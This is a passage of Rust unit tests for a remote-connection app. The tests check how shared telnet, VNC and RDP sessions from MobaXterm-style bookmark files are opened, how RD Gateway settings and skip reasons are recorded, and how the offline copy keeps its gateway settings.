    assert!(request.profile.post_connect.to_run().is_empty());
    // A copy under an identifier of this run: nothing saved answers to it.
    assert!(!is_shared(request.profile.id.as_str()));
    assert!(app.profiles().is_empty() && app.profile_summaries().is_empty());
}

#[test]
fn opening_a_shared_telnet_session_connects_with_what_the_file_said_and_saves_nothing() {
    let dir = tempfile::tempdir().expect("dir");
    let mut app = app_with_text(dir.path(), &other_protocols());
    let effects = app.update(Message::ConnectShared(id_of(&app, "console")));
    let [heimdall_app::Effect::ConnectTelnet { request, .. }] = effects.as_slice() else {
        panic!("{effects:?}");
    };
    assert_eq!(
        (request.profile.host.as_str(), request.profile.port),
        ("tel.example.com", 2323)
    );
    assert!(!is_shared(request.profile.id.as_str()));
    assert!(app.profiles().is_empty());
}

#[test]
fn opening_a_shared_vnc_session_keeps_the_safe_defaults_and_saves_nothing() {
    let dir = tempfile::tempdir().expect("dir");
    let mut app = app_with_text(dir.path(), &other_protocols());
    let effects = app.update(Message::ConnectShared(id_of(&app, "desk")));
    let [heimdall_app::Effect::ConnectVnc { request, .. }] = effects.as_slice() else {
        panic!("{effects:?}");
    };
    let profile = &request.profile;
    assert_eq!(
        (profile.host.as_str(), profile.port),
        ("vnc.example.com", 5901)
    );
    assert!(!profile.view_only && !profile.allow_no_password && !profile.require_tls);
    assert!(profile.username.is_none());
    assert!(!is_shared(profile.id.as_str()));
    assert!(app.profiles().is_empty());
}

/// Four RDP sessions, one per RD Gateway setting (C# fixture `MobaXtermSharedSessionsFixture`):
/// the server at field 19 and the packed settings at field 30 (`flags,mode,server,login,?,auth,`).
fn rd_gateway_file() -> String {
    let session = |name: &str, server: &str, settings: &str| {
        let mut fields = vec![""; 31];
        fields[0] = "pc.example.com";
        fields[19] = server;
        fields[30] = settings;
        format!("{name}= #91#4%{}\r\n", fields.join("%"))
    };
    format!(
        "[Bookmarks]\r\n{}{}{}{}",
        session("never", "", "0,0,,,,0,"),
        session("detect", "", "0,1,,,,0,"),
        session("always", "rdg.example.com", "0,2,rdg.example.com,svc,,2,"),
        session("card", "rdg.example.com", "0,2,rdg.example.com,,,3,"),
    )
}

#[test]
fn a_shared_rdp_session_keeps_its_rd_gateway_and_a_smart_card_one_is_skipped_with_a_reason() {
    use heimdall_app::shared_report::SkipReason;
    let dir = tempfile::tempdir().expect("dir");
    let (shared, _) = loaded(dir.path(), &rd_gateway_file());
    let state = &shared.sources()[0];
    assert_eq!(state.sessions, 3, "{state:?}");
    assert_eq!(state.refused, 1, "{state:?}");
    let gateway_of = |name: &str| {
        let session = shared
            .sessions_of("team")
            .iter()
            .find(|session| session.name() == name)
            .unwrap_or_else(|| panic!("{name} not loaded"));
        let SharedTarget::Rdp(rdp) = &session.target else {
            panic!("an RDP session");
        };
        rdp.extras.rd_gateway.clone()
    };
    assert_eq!(gateway_of("never"), None);
    assert_eq!(gateway_of("detect"), None);
    assert_eq!(gateway_of("always").as_deref(), Some("rdg.example.com"));
    let report = shared.report_of("team").expect("report");
    assert!(
        report.entries.iter().any(|entry| entry.session == "card"
            && entry.reason == Some(SkipReason::RdGatewayNotSupported)
            && entry.detail == "rdg.example.com"),
        "{report:?}"
    );
    assert!(
        shared.sessions().all(|session| session.name() != "card"),
        "never loaded as a direct connection"
    );
}

#[test]
fn the_offline_copy_keeps_the_rd_gateway_of_a_session() {
    let dir = tempfile::tempdir().expect("dir");
    let file = dir.path().join("team.mxtsessions");
    std::fs::write(&file, rd_gateway_file()).expect("write");
    let sources = vec![source("team", &file)];
    let mut shared = cached(dir.path());
    shared.load(&sources, &Variables::default());
    std::fs::remove_file(&file).expect("remove");
    let mut restarted = cached(dir.path());
    restarted.load(&sources, &Variables::default());
    assert!(restarted.sources()[0].offline.is_some());
    let gateways: Vec<Option<String>> = restarted
        .sessions_of("team")
        .iter()
        .map(|session| {
            let SharedTarget::Rdp(rdp) = &session.target else {
                panic!("an RDP session");
            };
            rdp.extras.rd_gateway.clone()
        })
        .collect();
    assert_eq!(
        gateways,
        [None, None, Some("rdg.example.com".to_owned())],
        "the copy goes through the gateway too"
    );
}
